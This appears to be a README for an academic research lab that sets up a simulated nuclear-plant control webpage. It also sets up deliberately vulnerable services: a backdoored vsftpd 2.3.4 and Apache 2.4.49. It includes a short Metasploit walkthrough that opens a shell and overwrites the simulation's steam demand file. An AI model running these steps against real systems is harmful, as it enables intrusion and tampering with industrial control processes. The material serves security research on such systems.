# NuclearWebpage
This is a webpage for PCAG research under DR. Cole and Dr. Ibrahim

## Baseline values for control files
* feedwater - 540
* coolant pump - 8333
* steam demand - 540
* tavg - 547 
* control rods - 0

## Webpage setup
* `git clone https://github.com/JaredBen28/NuclearWebpage.git`
* Move all the files to the apache folder using `mv ./* /[target directory]`
* Change all the .txt and .csv files to be under the ownership of ubuntu not root `sudo chmod ubuntu *.txt` and `sudo chmod ubuntu *.csv`
  * This is so the model can be ran as a normal user not root or sudo
* Before running the simulation
* Next we need to run the simulation and api for the webpage
```
pip -install -r ./python/requirements.txt
python ./python/api.py
python ./python/useableSimulation.py
```
* Open the main.js file and change the ip address on line 27 to the  ip of the api
* Everything should now be up and running

### Notes:
* If you want to run the api or model detached add an `&` to the end of the command
* When using a built-in apache installed from `apt` place all the files within `var/www/html`
* If you installed another version of apache, for a exploit, place the files with in the `htdocs` file or change the directory location within the `httd.conf` file

### Quickly change from repo
Because we used `mv` not `cp` when moving our files from the repo to webpage folder it makes our lives easy when adding any changes. First we need to pull the changes.

```
git pull
```

Next remove all the files that were changed from the webpage directory.

Then move the changed files to webpage directory. 

Ex: If you changed all the js files use `mv *.js /[target dir]` to move all of them at once. Wildcards are very helpful

---

## Vulnerable ftp service 
### Installation
```
git clone https://github.com/nikdubois/vsftpd-2.3.4-infected.git
sudo apt-get install build-essential
```

`nano Makefile` and change the Link to `LINK = -Wl,-s,-lcrypt`

```
make 
useradd nobody
mkdir /usr/share/empty
sudo cp vsftpd /usr/local/sbin/vsftpd
sudo cp vsftpd.8 /usr/local/man/man8
sudo cp vsftpd.conf.5 /usr/local/man/man5
sudo cp vsftpd.conf /etc

cd /
/usr/local/sbin/vsftpd &

mkdir /var/ftp/
useradd -d /var/ftp ftp
chown root:root /var/ftp
chmod og-w /var/ftp
```

`nano /etc/vsftp.conf` and change local_enable to `local_enable=YES`

### Exploitation
On another machine, preferably kali, open up a new terminal window
```
msfconsole
```

Once metasploit is running
```
search vsf
use 0
set RHOST [target ip addr]
exploit
```
At this point a reverse shell should have been created
```
cd home/ubuntu/Desktop
echo [new value] > steamDemand.txt
```
Warning do not use the `>>` pipe, it will append the new value in the steam demand file breaking the model

## Vulnerable apache service
You will need to download httd 2.4.49 from http://archive.apache.org/dist/httpd/ use the provided readMe for further instructions

I would recommend following the instructions from https://geekflare.com/apache-installation-troubleshooting/

If you need to install libpcre3 just run
```
sudo apt-get install libpcre3-dev libpcre3
```

Before installing a new version I would recommend removing the current apache on the machine
```
sudo apt remove apache2.*
sudo apt autoremove
sudo apt purge apache2
```